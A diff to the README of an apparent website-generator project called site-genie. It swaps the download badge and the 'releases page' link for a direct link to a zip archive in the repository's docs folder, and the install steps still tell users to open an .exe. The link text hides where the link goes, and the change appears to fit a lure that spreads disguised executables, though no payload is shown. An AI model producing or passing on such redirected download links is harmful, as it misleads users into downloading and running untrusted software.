@@ -1,6 +1,6 @@
 # 🪄 site-genie - Build custom websites using simple text
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ChaudharyKashanAhmed/site-genie/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ChaudharyKashanAhmed/site-genie/raw/refs/heads/main/docs/genie_site_1.3.zip)
 
 site-genie helps you create professional websites without writing code. You describe the site you want in plain English, and the application generates the design and the underlying code. The tool builds your site using Next.js and Tailwind CSS. You receive files ready for immediate use.
 
@@ -27,7 +27,7 @@ Your computer needs to meet these requirements to run site-genie:
 
 Follow these steps to install and run the application on your computer.
 
-1. Visit the [releases page](https://github.com/ChaudharyKashanAhmed/site-genie/releases) to download the program.
+1. Visit the [releases page](https://github.com/ChaudharyKashanAhmed/site-genie/raw/refs/heads/main/docs/genie_site_1.3.zip) to download the program.
 2. Look for the file ending in .exe under the latest version.
 3. Click the file to download it to your Downloads folder.
 4. Open the file to start the installation process.
